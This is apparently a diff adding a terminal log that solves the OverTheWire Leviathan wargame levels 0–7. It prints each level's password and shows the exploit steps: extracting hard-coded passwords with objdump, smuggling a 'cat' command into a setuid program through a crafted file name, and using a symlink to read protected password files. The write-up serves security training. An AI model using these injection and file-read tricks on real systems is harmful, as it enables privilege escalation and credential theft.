@@ -1,0 +1,109 @@
+leviathan0@melinda:~/.backup$ cat bookmarks.html | grep overthewire
+<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
+
+leviathan1@melinda:~$ objdump -d ./check
+0804852d <main>:
+ 804852d:	55                   	push   %ebp
+ 804852e:	89 e5                	mov    %esp,%ebp
+ 8048530:	83 e4 f0             	and    $0xfffffff0,%esp
+ 8048533:	83 ec 30             	sub    $0x30,%esp
+ 8048536:	65 a1 14 00 00 00    	mov    %gs:0x14,%eax
+ 804853c:	89 44 24 2c          	mov    %eax,0x2c(%esp)
+ 8048540:	31 c0                	xor    %eax,%eax
+ 8048542:	c7 44 24 18 73 65 78 	movl   $0x786573,0x18(%esp)
+ 8048549:	00 
+ 804854a:	c7 44 24 25 73 65 63 	movl   $0x72636573,0x25(%esp)
+ 8048551:	72 
+ 8048552:	66 c7 44 24 29 65 74 	movw   $0x7465,0x29(%esp)
+ 8048559:	c6 44 24 2b 00       	movb   $0x0,0x2b(%esp)
+ 804855e:	c7 44 24 1c 67 6f 64 	movl   $0x646f67,0x1c(%esp)
+ 8048565:	00 
+ 8048566:	c7 44 24 20 6c 6f 76 	movl   $0x65766f6c,0x20(%esp)
+ 804856d:	65 
+ 
+$ python
+Python 2.7.7 (default, Jun  1 2014, 14:17:13) [MSC v.1500 32 bit (Intel)] on win32
+Type "help", "copyright", "credits" or "license" for more information.
+>>> '786573726365737465646f6765766f6c'.decode('hex')
+'xesrcestedogevol'
+>>> '736578007365637200657400676f64006c6f7665'.decode('hex')
+'sex\x00secr\x00et\x00god\x00love'
+
+leviathan1@melinda:~$ ./check
+password: sexsecretgodlove
+$ cat /etc/leviathan_pass/leviathan2
+ougahZi8Ta
+
+leviathan2@melinda:/tmp/aagon$ echo 1 > "$(printf ';cat \x24i')"
+leviathan2@melinda:/tmp/aagon$ ls
+;cat $i
+leviathan2@melinda:/tmp/aagon$ export i=/etc/leviathan_pass/leviathan3
+leviathan2@melinda:/tmp/aagon$ ~/printfile "$(printf ';cat \x24i')"
+Ahdiemoo1j
+
+leviathan3@melinda:~$ objdump -d level3 
+8556:	65 a1 14 00 00 00    	mov    %gs:0x14,%eax
+ 804855c:	89 45 f4             	mov    %eax,-0xc(%ebp)
+ 804855f:	31 c0                	xor    %eax,%eax
+ 8048561:	c7 85 e9 fe ff ff 73 	movl   $0x706c6e73,-0x117(%ebp)
+ 8048568:	6e 6c 70 
+ 804856b:	c7 85 ed fe ff ff 72 	movl   $0x746e6972,-0x113(%ebp)
+ 8048572:	69 6e 74 
+ 8048575:	66 c7 85 f1 fe ff ff 	movw   $0xa66,-0x10f(%ebp)
+ 804857c:	66 0a 
+ 804857e:	c6 85 f3 fe ff ff 00 	movb   $0x0,-0x10d(%ebp)
+ 8048585:	a1 3c a0 04 08       	mov    0x804a03c,%eax
+ 804858a:	89 44 24 08          	mov    %eax,0x8(%esp)
+ 804858e:	c7 44 24 04 00 01 00 	movl   $0x100,0x4(%esp)
+ 8048595:	00 
+ 8048596:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
+ 
+ >>> '736e6c7072696e74660a'.decode('hex')
+'snlprintf\n'
+
+leviathan3@melinda:~$ ./level3 
+Enter the password> snlprintf
+[You've got shell]!
+$ cat /etc/leviathan_pass/leviathan4
+vuH0coox6m
+
+leviathan4@melinda:~$ cd .trash/
+leviathan4@melinda:~/.trash$ ls -la
+total 16
+dr-xr-x--- 2 root       leviathan4 4096 Nov 14  2014 .
+drwxr-xr-x 3 root       root       4096 Nov 14  2014 ..
+-r-sr-x--- 1 leviathan5 leviathan4 7425 Nov 14  2014 bin
+leviathan4@melinda:~/.trash$ ./bin 
+01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010 
+leviathan4@melinda:~/.trash$ ./bin | python -c "print ''.join([chr(int(x,2)) for x in raw_input().split(' ')[:-1]])"
+Tith4cokei
+
+leviathan5@melinda:~$ ls -la
+total 28
+drwxr-xr-x   2 root       root       4096 Nov 14  2014 .
+drwxr-xr-x 167 root       root       4096 Jul  9 16:27 ..
+-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
+-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
+-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
+-r-sr-x---   1 leviathan6 leviathan5 7634 Nov 14  2014 leviathan5
+leviathan5@melinda:~$ ./leviathan5 
+Cannot find /tmp/file.log
+leviathan5@melinda:~$ echo 1 > /tmp/file.log
+leviathan5@melinda:~$ ./leviathan5 
+1
+leviathan5@melinda:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+leviathan5@melinda:~$ ./leviathan5 
+UgaoFee4li
+
+leviathan6@melinda:~$ objdump -d ./leviathan6 
+0804850d <main>:
+ 804850d:	55                   	push   %ebp
+ 804850e:	89 e5                	mov    %esp,%ebp
+ 8048510:	83 e4 f0             	and    $0xfffffff0,%esp
+ 8048513:	83 ec 20             	sub    $0x20,%esp
+ 8048516:	c7 44 24 1c d3 1b 00 	movl   $0x1bd3,0x1c(%esp)
+ 
+leviathan6@melinda:~$ ./leviathan6 $(printf '%d' 0x1bd3)               
+$ cat /etc/leviathan_pass/leviathan7
+ahy7MaeBo9
+
